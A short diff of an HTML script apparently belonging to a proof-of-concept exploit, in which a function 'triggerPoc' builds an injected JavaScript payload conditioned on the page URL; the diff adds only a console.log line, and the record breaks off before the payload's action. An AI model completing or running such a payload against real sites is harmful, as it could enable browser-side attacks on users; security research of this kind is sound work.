@@ -2,6 +2,7 @@
 <script>
   function triggerPoc(url){
   const currUrl = location.href;
+    console.log(currUrl)
   const payload = `
   if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){
   window.__cloudx_called = true;
